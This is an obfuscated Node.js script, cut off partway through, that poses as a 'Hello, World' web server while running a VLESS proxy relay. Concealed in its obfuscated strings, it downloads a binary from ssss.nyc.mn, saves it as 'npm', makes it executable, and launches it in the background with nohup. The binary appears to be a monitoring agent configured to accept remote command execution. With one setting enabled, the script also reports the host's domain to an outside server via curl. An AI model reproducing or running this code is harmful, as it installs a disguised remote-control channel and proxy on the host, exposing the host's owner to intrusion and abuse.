const _0x21c0f6=_0x5620;(function(_0x95e6d0,_0x11cd6b){const _0x1446dd=_0x5620,_0x241ec4=_0x95e6d0();while(!![]){try{const _0x20d6d9=-parseInt(_0x1446dd(0xf7))/0x1*(-parseInt(_0x1446dd(0x12a))/0x2)+-parseInt(_0x1446dd(0xed))/0x3*(parseInt(_0x1446dd(0x17c))/0x4)+-parseInt(_0x1446dd(0x105))/0x5+-parseInt(_0x1446dd(0x169))/0x6*(-parseInt(_0x1446dd(0x197))/0x7)+-parseInt(_0x1446dd(0xfd))/0x8*(parseInt(_0x1446dd(0x112))/0x9)+parseInt(_0x1446dd(0xe8))/0xa*(-parseInt(_0x1446dd(0xcc))/0xb)+parseInt(_0x1446dd(0x1a5))/0xc;if(_0x20d6d9===_0x11cd6b)break;else _0x241ec4['push'](_0x241ec4['shift']());}catch(_0x54d601){_0x241ec4['push'](_0x241ec4['shift']());}}}(_0x2cde,0x189bb));function _0x2cde(){const _0x115a42=['toISOString','Upload\x20error:\x20','Connected\x20to\x20','writable','\x1b[33m','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','currentStreamRes','arch','GET','):\x20','--tls','9YbVoHv','stream','releaseLock','Server\x20is\x20running\x20on\x20port\x20','Hello,\x20World\x0a','Session\x20timeout:\x20','2083','Transfer-Encoding','reset','vless://','Cleaning\x20up\x20session\x20','\x20timed\x20out\x20without\x20downstream','Processing\x20packet:\x20seq=','Too\x20many\x20buffered\x20packets','remote','now','buffer','NAME','delete','decode','Content-Type','toString','Remote\x20connection\x20established','connect\x20timeout','2476vtQzxx','reading_done','nohup\x20./npm\x20-s\x20','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','AUTO_ACCESS','Error\x20starting\x20downstream:\x20','curl\x20-s\x20--max-time\x201\x20ipv6.ip.sb','Max\x20buffered\x20posts:\x20','VLESS\x20header\x20parsed\x20successfully','Sending\x20VLESS\x20response\x20header\x20(','bufferSize','2053','Processed\x20packet\x20seq=','debug','&mode=packet-up#','8443','XPATH','destroyed','concat','createConnection','child_process','npm\x20download\x20successfully','Failed\x20to\x20initialize\x20VLESS:\x20','done','log','resume','Error\x20sending\x20request:','initialized','npm\x20running\x20error:\x20','random','localhost',':443?encryption=none&security=tls&sni=','pendingBuffers','Error\x20added\x20Task:','net','https://amd64.ssss.nyc.mn/agent','Relay\x20error:','writeFileSync','npm\x20is\x20running','lastActivity','bufferedData','headersTimeout','destroy','cleanup','createWriteStream','port','size','timeout','\x20-p\x20','pendingPackets','NEZHA_KEY','write','Session\x20','\x1b[32m','arm64','fill','npm','PORT','finish','application/octet-stream','Read\x20controller\x20error:','https://','none','74922XFjGDQ','Created\x20new\x20session\x20with\x20UUID:\x20','socket\x20hang\x20up','\x1b[0m','writeHead','Failed\x20to\x20get\x20IP\x20address:','443','slice','includes','keepAliveTimeout','https://arm64.ssss.nyc.mn/agent','Failed\x20to\x20write\x20to\x20remote:\x20','replaceAll','data','message','Socket\x20is\x20destroyed','method','read\x20vless\x20header\x20error:\x20','pipeTo','4pHuwvg','&path=','unlink','unsupported\x20command:\x20','join','2087','length','config.yaml','arm',']\x20[','vlessHeader','2048','split','pop','Read\x20controller\x20close\x20error:','%2F','cleaned','reduce','processPacket','headersSent','UUID','Created\x20new\x20session\x20for\x20POST:\x20','VLESS\x20header\x20parse\x20error:\x20','url','utf-8','alpnProtocol','http','105APzMqB','catch','listen','has','no-store','Created\x20new\x20session\x20for\x20GET:\x20','\x20>/dev/null\x202>&1\x20&','Connection\x20failed:\x20','chunked','initializeVLESS','LOG_LEVEL','read\x20address\x20type\x20failed','pipe','Initializing\x20VLESS\x20connection\x20from\x20first\x20packet','2007936aNpRIU','2096','_writeToRemote','hostname','substr','true','NEZHA_PORT','New\x20secure\x20connection\x20using:\x20','CHUNK_SIZE','https://arm64.ssss.nyc.mn/v1','MAX_POST_SIZE','header\x20length\x20too\x20short','nextSeq','https://amd64.ssss.nyc.mn/v1','error','headerSent','push','25003SaVCZx','end','writableEnded','resp','NEZHA_SERVER','/([^/]+)(?:/([0-9]+))?$','info','SESSION_TIMEOUT','Remote\x20error:\x20','secureConnection','nextTick','\x0aclient_secret:\x20','getReader','base64','Socket\x20error:','\x1b[36m','setKeepAlive','Failed\x20to\x20start\x20downstream\x20for\x20session:\x20','nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','readable','finally','/bin/bash','get','env','trim','http/1.1','text/plain','Automatic\x20Access\x20Task\x20added\x20successfully:','80oeiNKG','_startDownstreamResponse','socket','enqueue','sub','597273XiMGYA','uuid','constructor','setNoDelay','set','startDownstream','\x22}\x27','from','Buffered\x20packet\x20seq=','floor','148CIAwGO','downstreamStarted','chmod\x20+x\x20npm','=================================','BUFFER_SIZE','warn','1572424PYRYWA','read','aborted','MAX_BUFFERED_POSTS','Failed\x20to\x20parse\x20hostname','value','responseHeader',',\x20size=','116170YOfvMR','close'];_0x2cde=function(){return _0x115a42;};return _0x2cde();}const os=require('os'),fs=require('fs'),net=require(_0x21c0f6(0x14c)),http=require(_0x21c0f6(0x196)),axios=require('axios'),{Buffer}=require(_0x21c0f6(0x122)),{exec,execSync}=require(_0x21c0f6(0x13e)),UUID=process[_0x21c0f6(0xe3)][_0x21c0f6(0x190)]||'ffe5eedd-a25e-4eab-9d07-c7a2242b6982',NEZHA_SERVER=process['env'][_0x21c0f6(0xd0)]||'',NEZHA_PORT=process[_0x21c0f6(0xe3)][_0x21c0f6(0x1ab)]||'',NEZHA_KEY=process[_0x21c0f6(0xe3)][_0x21c0f6(0x15c)]||'',AUTO_ACCESS=process[_0x21c0f6(0xe3)][_0x21c0f6(0x12e)]||![],XPATH=process[_0x21c0f6(0xe3)][_0x21c0f6(0x13a)]||UUID[_0x21c0f6(0x170)](0x0,0x8),SUB_PATH=process['env']['SUB_PATH']||_0x21c0f6(0xec),DOMAIN=process['env']['DOMAIN']||'',NAME=process[_0x21c0f6(0xe3)][_0x21c0f6(0x123)]||'Vls',PORT=process[_0x21c0f6(0xe3)][_0x21c0f6(0x163)]||0xbb8,SETTINGS={['UUID']:UUID,[_0x21c0f6(0x1a1)]:_0x21c0f6(0x168),[_0x21c0f6(0xfb)]:_0x21c0f6(0x187),['XPATH']:_0x21c0f6(0x18b)+XPATH,['MAX_BUFFERED_POSTS']:0x1e,[_0x21c0f6(0x1af)]:0xf4240,[_0x21c0f6(0xd3)]:0x7530,[_0x21c0f6(0x1ad)]:0x400*0x400,['TCP_NODELAY']:!![],['TCP_KEEPALIVE']:!![]};function validate_uuid(_0x1d68e5,_0x6294ba){for(let _0x1c99f2=0x0;_0x1c99f2<0x10;_0x1c99f2++){if(_0x1d68e5[_0x1c99f2]!==_0x6294ba[_0x1c99f2])return![];}return!![];}function concat_typed_arrays(_0x5aeacf,..._0xece741){const _0x229b37=_0x21c0f6;if(!_0xece741||_0xece741['length']<0x1)return _0x5aeacf;let _0x5673c4=_0x5aeacf['length'];for(let _0x149442 of _0xece741)_0x5673c4+=_0x149442[_0x229b37(0x182)];const _0xaf0c11=new _0x5aeacf[(_0x229b37(0xef))](_0x5673c4);_0xaf0c11[_0x229b37(0xf1)](_0x5aeacf,0x0),_0x5673c4=_0x5aeacf[_0x229b37(0x182)];for(let _0x32199e of _0xece741){_0xaf0c11[_0x229b37(0xf1)](_0x32199e,_0x5673c4),_0x5673c4+=_0x32199e[_0x229b37(0x182)];}return _0xaf0c11;}function log(_0x25b55d,..._0x526349){const _0xf181e2=_0x21c0f6;if(SETTINGS['LOG_LEVEL']===_0xf181e2(0x168))return;const _0x33e029={'debug':0x0,'info':0x1,'warn':0x2,'error':0x3},_0x1a61b2={'debug':_0xf181e2(0xdb),'info':_0xf181e2(0x15f),'warn':_0xf181e2(0x10b),'error':'\x1b[31m','reset':_0xf181e2(0x16c)},_0xbe4df3=_0x33e029[SETTINGS[_0xf181e2(0x1a1)]]||0x1,_0x1da2f6=_0x33e029[_0x25b55d]||0x0;if(_0x1da2f6>=_0xbe4df3){const _0x4b6267=new Date()[_0xf181e2(0x107)](),_0x2e4d50=_0x1a61b2[_0x25b55d]||_0x1a61b2[_0xf181e2(0x11a)];console[_0xf181e2(0x142)](_0x2e4d50+'['+_0x4b6267+_0xf181e2(0x185)+_0x25b55d+']',..._0x526349,_0x1a61b2[_0xf181e2(0x11a)]);}}const getDownloadUrl=()=>{const _0x1c5d10=_0x21c0f6,_0x27bdbd=os[_0x1c5d10(0x10e)]();return _0x27bdbd===_0x1c5d10(0x184)||_0x27bdbd===_0x1c5d10(0x160)||_0x27bdbd==='aarch64'?!NEZHA_PORT?_0x1c5d10(0x1ae):_0x1c5d10(0x173):!NEZHA_PORT?_0x1c5d10(0xc8):_0x1c5d10(0x14d);},downloadFile=async()=>{const _0x250a20=_0x21c0f6;if(!NEZHA_KEY)return;try{const _0x376a4b=getDownloadUrl(),_0x522aba=await axios({'method':_0x250a20(0xe2),'url':_0x376a4b,'responseType':'stream'}),_0x35443a=fs[_0x250a20(0x156)](_0x250a20(0x162));return _0x522aba['data'][_0x250a20(0x1a3)](_0x35443a),new Promise((_0x50fc39,_0x44aeb9)=>{const _0xef6d9a=_0x250a20;_0x35443a['on'](_0xef6d9a(0x164),()=>{const _0x3b18c3=_0xef6d9a;console[_0x3b18c3(0x142)](_0x3b18c3(0x13f)),exec(_0x3b18c3(0xf9),_0x1db4d4=>{if(_0x1db4d4)_0x44aeb9(_0x1db4d4);_0x50fc39();});}),_0x35443a['on']('error',_0x44aeb9);});}catch(_0x244243){throw _0x244243;}},runnz=async()=>{const _0x3af3b6=_0x21c0f6;await downloadFile();let _0x15993b='',_0x34131e='';if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x5be5fb=[_0x3af3b6(0x16f),'8443',_0x3af3b6(0x1a6),_0x3af3b6(0x181),_0x3af3b6(0x118),'2053'];_0x15993b=_0x5be5fb[_0x3af3b6(0x171)](NEZHA_PORT)?_0x3af3b6(0x111):'',_0x34131e=_0x3af3b6(0x12c)+NEZHA_SERVER+':'+NEZHA_PORT+_0x3af3b6(0x15a)+NEZHA_KEY+'\x20'+_0x15993b+_0x3af3b6(0x19d);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x224634=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x3af3b6(0x188)](':')[_0x3af3b6(0x189)]():'',_0x2c7248=new Set([_0x3af3b6(0x16f),_0x3af3b6(0x139),'2096','2087',_0x3af3b6(0x118),_0x3af3b6(0x135)]),_0xa7db66=_0x2c7248[_0x3af3b6(0x19a)](_0x224634)?_0x3af3b6(0x1aa):'false',_0x49e0c3=_0x3af3b6(0xd7)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20'+_0xa7db66+_0x3af3b6(0x10c)+UUID;fs[_0x3af3b6(0x14f)](_0x3af3b6(0x183),_0x49e0c3);}_0x34131e=_0x3af3b6(0xde);}else return;}try{exec(_0x34131e,{'shell':_0x3af3b6(0xe1)}),console[_0x3af3b6(0x142)](_0x3af3b6(0x150));}catch(_0x272fed){console[_0x3af3b6(0xc9)](_0x3af3b6(0x146)+_0x272fed);}};async function addAccessTask(){const _0x556ad2=_0x21c0f6;if(AUTO_ACCESS!==!![])return;try{if(!DOMAIN)return;const _0x4e286d=_0x556ad2(0x167)+DOMAIN,_0x1bcb05='curl\x20-X\x20POST\x20\x22https://oooo.serv00.net/add-url\x22\x20-H\x20\x22Content-Type:\x20application/json\x22\x20-d\x20\x27{\x22url\x22:\x20\x22'+_0x4e286d+_0x556ad2(0xf3);exec(_0x1bcb05,(_0x1eedc4,_0x294f89,_0x2032e9)=>{const _0x3a003b=_0x556ad2;if(_0x1eedc4){console[_0x3a003b(0xc9)](_0x3a003b(0x144),_0x1eedc4[_0x3a003b(0x177)]);return;}console[_0x3a003b(0x142)](_0x3a003b(0xe7),_0x294f89);});}catch(_0xff8188){console[_0x556ad2(0xc9)](_0x556ad2(0x14b),_0xff8188[_0x556ad2(0x177)]);}}function parse_uuid(_0x537cd4){const _0x17918e=_0x21c0f6;_0x537cd4=_0x537cd4[_0x17918e(0x175)]('-','');const _0x81b05b=[];for(let _0x31a523=0x0;_0x31a523<0x10;_0x31a523++){_0x81b05b[_0x17918e(0xcb)](parseInt(_0x537cd4[_0x17918e(0x1a9)](_0x31a523*0x2,0x2),0x10));}return _0x81b05b;}async function read_vless_header(_0x5af9e2,_0x5da1c2){const _0x3ab292=_0x21c0f6;let _0x33bd36=0x0,_0x136900=new Uint8Array(),_0x562d86={'value':_0x136900,'done':![]};async function _0x15e618(_0x41ed23){const _0x5eedd6=_0x5620;if(_0x562d86[_0x5eedd6(0x141)])throw new Error(_0x5eedd6(0x1b0));const _0xacd58a=_0x41ed23-_0x33bd36;if(_0xacd58a<0x1)return;_0x562d86=await read_atleast(_0x5af9e2,_0xacd58a),_0x33bd36+=_0x562d86[_0x5eedd6(0x102)][_0x5eedd6(0x182)],_0x136900=concat_typed_arrays(_0x136900,_0x562d86[_0x5eedd6(0x102)]);}await _0x15e618(0x1+0x10+0x1);const _0x53ae1b=_0x136900[0x0],_0x398b23=_0x136900[_0x3ab292(0x170)](0x1,0x1+0x10),_0x4ad678=parse_uuid(_0x5da1c2);if(!validate_uuid(_0x398b23,_0x4ad678))throw new Error('invalid\x20UUID');const _0x445c20=_0x136900[0x1+0x10],_0x5bd1ca=0x1+0x10+0x1+_0x445c20+0x1+0x2+0x1;await _0x15e618(_0x5bd1ca+0x1);const _0x34c065=_0x136900[0x1+0x10+0x1+_0x445c20],_0xb3302d=0x1;if(_0x34c065!==_0xb3302d)throw new Error(_0x3ab292(0x17f)+_0x34c065);const _0x3106fb=(_0x136900[_0x5bd1ca-0x1-0x2]<<0x8)+_0x136900[_0x5bd1ca-0x1-0x1],_0x4bef60=_0x136900[_0x5bd1ca-0x1],_0x6dbb25=0x1,_0x416ee6=0x2,_0xce09d8=0x3;let _0x3a992c=-0x1;if(_0x4bef60===_0x6dbb25)_0x3a992c=_0x5bd1ca+0x4;else{if(_0x4bef60===_0xce09d8)_0x3a992c=_0x5bd1ca+0x10;else _0x4bef60===_0x416ee6&&(_0x3a992c=_0x5bd1ca+0x1+_0x136900[_0x5bd1ca]);}if(_0x3a992c<0x0)throw new Error(_0x3ab292(0x1a2));await _0x15e618(_0x3a992c);const _0x55c20b=_0x5bd1ca;let _0x1c88b8='';if(_0x4bef60===_0x6dbb25)_0x1c88b8=_0x136900[_0x3ab292(0x170)](_0x55c20b,_0x55c20b+0x4)[_0x3ab292(0x180)]('.');else{if(_0x4bef60===_0x416ee6)_0x1c88b8=new TextDecoder()[_0x3ab292(0x125)](_0x136900['slice'](_0x55c20b+0x1,_0x55c20b+0x1+_0x136900[_0x55c20b]));else _0x4bef60===_0xce09d8&&(_0x1c88b8=_0x136900[_0x3ab292(0x170)](_0x55c20b,_0x55c20b+0x10)[_0x3ab292(0x18d)]((_0x32a369,_0x359e30,_0x2a78b9,_0x50a38e)=>_0x2a78b9%0x2?_0x32a369[_0x3ab292(0x13c)](((_0x50a38e[_0x2a78b9-0x1]<<0x8)+_0x359e30)['toString'](0x10)):_0x32a369,[])[_0x3ab292(0x180)](':'));}if(!_0x1c88b8){log('error',_0x3ab292(0x101));throw new Error('parse\x20hostname\x20failed');}return log(_0x3ab292(0xd2),'VLESS\x20connection\x20to\x20'+_0x1c88b8+':'+_0x3106fb),{'hostname':_0x1c88b8,'port':_0x3106fb,'data':_0x136900[_0x3ab292(0x170)](_0x3a992c),'resp':new Uint8Array([_0x53ae1b,0x0])};}async function read_atleast(_0x35b59d,_0x38b347){const _0xc7c03b=_0x21c0f6,_0x451a9b=[];let _0x2b4b4a=![];while(_0x38b347>0x0&&!_0x2b4b4a){const _0xaef8e7=await _0x35b59d[_0xc7c03b(0xfe)]();if(_0xaef8e7[_0xc7c03b(0x102)]){const _0x6a1152=new Uint8Array(_0xaef8e7[_0xc7c03b(0x102)]);_0x451a9b[_0xc7c03b(0xcb)](_0x6a1152),_0x38b347-=_0x6a1152[_0xc7c03b(0x182)];}_0x2b4b4a=_0xaef8e7[_0xc7c03b(0x141)];}if(_0x38b347>0x0)throw new Error('not\x20enough\x20data\x20to\x20read');return{'value':concat_typed_arrays(..._0x451a9b),'done':_0x2b4b4a};}async function parse_header(_0x4e79ba,_0x42ca5c){const _0x3fb1bb=_0x21c0f6;log(_0x3fb1bb(0x137),'Starting\x20to\x20parse\x20VLESS\x20header');const _0x1583ad=_0x42ca5c[_0x3fb1bb(0xdf)][_0x3fb1bb(0xd8)]();try{const _0x2f5666=await read_vless_header(_0x1583ad,_0x4e79ba);return log(_0x3fb1bb(0x137),_0x3fb1bb(0x132)),_0x2f5666;}catch(_0x27ab9b){log(_0x3fb1bb(0xc9),_0x3fb1bb(0x192)+_0x27ab9b[_0x3fb1bb(0x177)]);throw new Error(_0x3fb1bb(0x17a)+_0x27ab9b['message']);}finally{_0x1583ad[_0x3fb1bb(0x114)]();}}async function connect_remote(_0x50f9bf,_0x35d377){const _0x3c83b9=_0x21c0f6,_0x597e47=0x1f40;try{const _0xd843c9=await timed_connect(_0x50f9bf,_0x35d377,_0x597e47);return _0xd843c9[_0x3c83b9(0xf0)](!![]),_0xd843c9[_0x3c83b9(0xdc)](!![],0x3e8),_0xd843c9[_0x3c83b9(0x134)]=parseInt(SETTINGS[_0x3c83b9(0xfb)])*0x400,log('info',_0x3c83b9(0x109)+_0x50f9bf+':'+_0x35d377),_0xd843c9;}catch(_0x31b9dd){log(_0x3c83b9(0xc9),_0x3c83b9(0x19e)+_0x31b9dd[_0x3c83b9(0x177)]);throw _0x31b9dd;}}function timed_connect(_0x241bfe,_0x219c93,_0x4e0b1b){return new Promise((_0x4eab40,_0x2cc6df)=>{const _0x11d17a=_0x5620,_0x5d50c7=net[_0x11d17a(0x13d)]({'host':_0x241bfe,'port':_0x219c93}),_0x4b5a5f=setTimeout(()=>{const _0x3cd84c=_0x11d17a;_0x2cc6df(new Error(_0x3cd84c(0x129)));},_0x4e0b1b);_0x5d50c7['on']('connect',()=>{clearTimeout(_0x4b5a5f),_0x4eab40(_0x5d50c7);}),_0x5d50c7['on']('error',_0x55ad0c=>{clearTimeout(_0x4b5a5f),_0x2cc6df(_0x55ad0c);});});}function pipe_relay(){async function _0x3334d4(_0x3aa87c,_0x2ea9da,_0x1b2588){const _0x12862f=_0x5620,_0x4533ac=parseInt(SETTINGS[_0x12862f(0x1ad)]);if(_0x1b2588[_0x12862f(0x182)]>0x0){if(_0x2ea9da['write'])_0x2ea9da['cork'](),_0x2ea9da[_0x12862f(0x15d)](_0x1b2588),process[_0x12862f(0xd6)](()=>_0x2ea9da['uncork']());else{const _0x5107c6=_0x2ea9da[_0x12862f(0x10a)]['getWriter']();try{await _0x5107c6[_0x12862f(0x15d)](_0x1b2588);}finally{_0x5107c6[_0x12862f(0x114)]();}}}try{_0x3aa87c[_0x12862f(0x1a3)]?(_0x3aa87c['pause'](),_0x3aa87c['pipe'](_0x2ea9da,{'end':!![],'highWaterMark':_0x4533ac}),_0x3aa87c[_0x12862f(0x143)]()):await _0x3aa87c['readable'][_0x12862f(0x17b)](_0x2ea9da['writable'],{'preventClose':![],'preventAbort':![],'preventCancel':![],'signal':AbortSignal[_0x12862f(0x159)](SETTINGS['SESSION_TIMEOUT'])});}catch(_0x59df6e){!_0x59df6e['message'][_0x12862f(0x171)](_0x12862f(0xff))&&log('error',_0x12862f(0x14e),_0x59df6e['message']);throw _0x59df6e;}}return _0x3334d4;}function socketToWebStream(_0x1a6953){const _0xd823a0=_0x21c0f6;let _0x34a4f5,_0x18e63b;return _0x1a6953['on'](_0xd823a0(0xc9),_0x2486bc=>{const _0x4e1565=_0xd823a0;log(_0x4e1565(0xc9),_0x4e1565(0xda),_0x2486bc[_0x4e1565(0x177)]),_0x34a4f5?.['error'](_0x2486bc),_0x18e63b?.[_0x4e1565(0xc9)](_0x2486bc);}),{'readable':new ReadableStream({'start'(_0x23b4c7){_0x34a4f5=_0x23b4c7,_0x1a6953['on']('data',_0x5da33c=>{const _0x20063e=_0x5620;try{_0x23b4c7['enqueue'](_0x5da33c);}catch(_0x49c24a){log('error',_0x20063e(0x166),_0x49c24a[_0x20063e(0x177)]);}}),_0x1a6953['on']('end',()=>{const _0x406dbc=_0x5620;try{_0x23b4c7['close']();}catch(_0x5695e7){log(_0x406dbc(0xc9),_0x406dbc(0x18a),_0x5695e7[_0x406dbc(0x177)]);}});},'cancel'(){const _0x22ed5f=_0xd823a0;_0x1a6953[_0x22ed5f(0x154)]();}}),'writable':new WritableStream({'start'(_0x2bf8af){_0x18e63b=_0x2bf8af;},'write'(_0x22ab0){return new Promise((_0x4be68e,_0x20c1d5)=>{const _0x58f287=_0x5620;if(_0x1a6953['destroyed']){_0x20c1d5(new Error(_0x58f287(0x178)));return;}_0x1a6953[_0x58f287(0x15d)](_0x22ab0,_0x5f0b0f=>{if(_0x5f0b0f)_0x20c1d5(_0x5f0b0f);else _0x4be68e();});});},'close'(){const _0x2c3156=_0xd823a0;!_0x1a6953[_0x2c3156(0x13b)]&&_0x1a6953['end']();},'abort'(_0x5d6fa0){_0x1a6953['destroy'](_0x5d6fa0);}})};}function relay(_0x415aab,_0x588ab6,_0x554eee,_0x8a0e21){const _0x5ee515=_0x21c0f6,_0x5db0b1=pipe_relay();let _0x3df079=![];const _0x572530=socketToWebStream(_0x554eee);function _0x4c5faf(){const _0x3551f6=_0x5620;if(!_0x3df079){_0x3df079=!![];try{_0x554eee[_0x3551f6(0x154)]();}catch(_0x110802){!_0x110802[_0x3551f6(0x177)][_0x3551f6(0x171)](_0x3551f6(0xff))&&!_0x110802[_0x3551f6(0x177)][_0x3551f6(0x171)]('socket\x20hang\x20up')&&log(_0x3551f6(0xc9),'Cleanup\x20error:\x20'+_0x110802[_0x3551f6(0x177)]);}}}const _0x2494d1=_0x5db0b1(_0x588ab6,_0x572530,_0x8a0e21[_0x5ee515(0x176)])[_0x5ee515(0x198)](_0x4ac8bd=>{const _0x559a1b=_0x5ee515;!_0x4ac8bd[_0x559a1b(0x177)][_0x559a1b(0x171)](_0x559a1b(0xff))&&!_0x4ac8bd[_0x559a1b(0x177)][_0x559a1b(0x171)](_0x559a1b(0x16b))&&log(_0x559a1b(0xc9),_0x559a1b(0x108)+_0x4ac8bd[_0x559a1b(0x177)]);})[_0x5ee515(0xe0)](()=>{const _0x5c3d51=_0x5ee515;_0x588ab6['reading_done']&&_0x588ab6[_0x5c3d51(0x12b)]();}),_0x3f0d57=_0x5db0b1(_0x572530,_0x588ab6,_0x8a0e21['resp'])[_0x5ee515(0x198)](_0x266b4a=>{const _0x4c326f=_0x5ee515;!_0x266b4a['message'][_0x4c326f(0x171)]('aborted')&&!_0x266b4a['message'][_0x4c326f(0x171)]('socket\x20hang\x20up')&&log(_0x4c326f(0xc9),'Download\x20error:\x20'+_0x266b4a[_0x4c326f(0x177)]);});_0x3f0d57[_0x5ee515(0xe0)](()=>_0x2494d1)[_0x5ee515(0xe0)](_0x4c5faf);}const sessions=new Map();class Session{constructor(_0x3745fc){const _0x4b67d2=_0x21c0f6;this[_0x4b67d2(0xee)]=_0x3745fc,this[_0x4b67d2(0x1b1)]=0x0,this['downstreamStarted']=![],this[_0x4b67d2(0x151)]=Date[_0x4b67d2(0x121)](),this[_0x4b67d2(0x186)]=null,this[_0x4b67d2(0x120)]=null,this[_0x4b67d2(0x145)]=![],this[_0x4b67d2(0x103)]=null,this['headerSent']=![],this[_0x4b67d2(0x152)]=new Map(),this[_0x4b67d2(0x18c)]=![],this[_0x4b67d2(0x15b)]=[],this[_0x4b67d2(0x10d)]=null,this[_0x4b67d2(0x14a)]=new Map(),log('debug',_0x4b67d2(0x16a)+_0x3745fc);}async[_0x21c0f6(0x1a0)](_0x197e80){const _0x42ebee=_0x21c0f6;if(this['initialized'])return!![];try{log(_0x42ebee(0x137),_0x42ebee(0x1a4));const _0x2ba179=new ReadableStream({'start'(_0x52d361){const _0x227a52=_0x42ebee;_0x52d361[_0x227a52(0xeb)](_0x197e80),_0x52d361[_0x227a52(0x106)]();}}),_0x2605fc={'readable':_0x2ba179,'writable':new WritableStream()};return this[_0x42ebee(0x186)]=await parse_header(SETTINGS['UUID'],_0x2605fc),log('info','VLESS\x20header\x20parsed:\x20'+this['vlessHeader'][_0x42ebee(0x1a8)]+':'+this['vlessHeader'][_0x42ebee(0x157)]),this[_0x42ebee(0x120)]=await connect_remote(this[_0x42ebee(0x186)]['hostname'],this[_0x42ebee(0x186)][_0x42ebee(0x157)]),log(_0x42ebee(0xd2),_0x42ebee(0x128)),this['initialized']=!![],!![];}catch(_0x9964a4){return log(_0x42ebee(0xc9),_0x42ebee(0x140)+_0x9964a4[_0x42ebee(0x177)]),![];}}async['processPacket'](_0x44c993,_0x15654e){const _0x4de1b1=_0x21c0f6;try{this[_0x4de1b1(0x14a)][_0x4de1b1(0xf1)](_0x44c993,_0x15654e),log('debug',_0x4de1b1(0xf5)+_0x44c993+_0x4de1b1(0x104)+_0x15654e[_0x4de1b1(0x182)]);while(this[_0x4de1b1(0x14a)][_0x4de1b1(0x19a)](this[_0x4de1b1(0x1b1)])){const _0x5dbc85=this['pendingBuffers'][_0x4de1b1(0xe2)](this[_0x4de1b1(0x1b1)]);this['pendingBuffers'][_0x4de1b1(0x124)](this[_0x4de1b1(0x1b1)]);if(!this[_0x4de1b1(0x145)]&&this[_0x4de1b1(0x1b1)]===0x0){if(!await this[_0x4de1b1(0x1a0)](_0x5dbc85))throw new Error('Failed\x20to\x20initialize\x20VLESS\x20connection');this['responseHeader']=Buffer[_0x4de1b1(0xf4)](this[_0x4de1b1(0x186)][_0x4de1b1(0xcf)]),await this['_writeToRemote'](this[_0x4de1b1(0x186)][_0x4de1b1(0x176)]),this['currentStreamRes']&&this['_startDownstreamResponse']();}else{if(!this[_0x4de1b1(0x145)]){log(_0x4de1b1(0xfc),'Received\x20out\x20of\x20order\x20packet\x20seq='+_0x44c993+'\x20before\x20initialization');continue;}await this[_0x4de1b1(0x1a7)](_0x5dbc85);}this['nextSeq']++,log(_0x4de1b1(0x137),_0x4de1b1(0x136)+(this[_0x4de1b1(0x1b1)]-0x1));}if(this[_0x4de1b1(0x14a)][_0x4de1b1(0x158)]>SETTINGS[_0x4de1b1(0x100)])throw new Error(_0x4de1b1(0x11f));return!![];}catch(_0x45d676){log('error','Process\x20packet\x20error:\x20'+_0x45d676[_0x4de1b1(0x177)]);throw _0x45d676;}}[_0x21c0f6(0xe9)](){const _0x51dca3=_0x21c0f6;if(!this[_0x51dca3(0x10d)]||!this['responseHeader'])return;try{const _0xe2b01f=this['currentStreamRes'][_0x51dca3(0xea)]?.[_0x51dca3(0x195)]||_0x51dca3(0xe5),_0xd6e80c=_0xe2b01f==='h2';!this['headerSent']&&(log(_0x51dca3(0x137),_0x51dca3(0x133)+_0xe2b01f+_0x51dca3(0x110)+this[_0x51dca3(0x103)][_0x51dca3(0x182)]+'\x20bytes'),this[_0x51dca3(0x10d)][_0x51dca3(0x15d)](this[_0x51dca3(0x103)]),this[_0x51dca3(0xca)]=!![]);if(_0xd6e80c){this[_0x51dca3(0x10d)][_0x51dca3(0xea)][_0x51dca3(0xf0)](!![]);const _0x1d090b=new require(_0x51dca3(0x113))['Transform']({'transform'(_0x3d4077,_0x5af074,_0x5ad14d){const _0x4611f0=0x4000;for(let _0x53f395=0x0;_0x53f395<_0x3d4077['length'];_0x53f395+=_0x4611f0){this['push'](_0x3d4077['slice'](_0x53f395,_0x53f395+_0x4611f0));}_0x5ad14d();}});this['remote'][_0x51dca3(0x1a3)](_0x1d090b)['pipe'](this[_0x51dca3(0x10d)]);}else this['remote'][_0x51dca3(0x1a3)](this['currentStreamRes']);this[_0x51dca3(0x120)]['on'](_0x51dca3(0xcd),()=>{const _0x57045b=_0x51dca3;!this[_0x57045b(0x10d)][_0x57045b(0xce)]&&this[_0x57045b(0x10d)][_0x57045b(0xcd)]();}),this[_0x51dca3(0x120)]['on'](_0x51dca3(0xc9),_0x1650a6=>{const _0x33219e=_0x51dca3;log(_0x33219e(0xc9),_0x33219e(0xd4)+_0x1650a6['message']),!this[_0x33219e(0x10d)]['writableEnded']&&this[_0x33219e(0x10d)][_0x33219e(0xcd)]();});}catch(_0x207d4e){log(_0x51dca3(0xc9),_0x51dca3(0x12f)+_0x207d4e['message']),this['cleanup']();}}[_0x21c0f6(0xf2)](_0xe3f530,_0x54a4a2){const _0x419527=_0x21c0f6;return!_0xe3f530[_0x419527(0x18f)]&&_0xe3f530[_0x419527(0x16d)](0xc8,_0x54a4a2),this[_0x419527(0x10d)]=_0xe3f530,this[_0x419527(0x145)]&&this[_0x419527(0x103)]&&this[_0x419527(0xe9)](),_0xe3f530['on'](_0x419527(0x106),()=>{const _0x3423f8=_0x419527;log('info','Client\x20connection\x20closed'),this[_0x3423f8(0x155)]();}),!![];}async['_writeToRemote'](_0x252f5a){if(!this['remote']||this['remote']['destroyed'])throw new Error('Remote\x20connection\x20not\x20available');return new Promise((_0x464705,_0x225889)=>{const 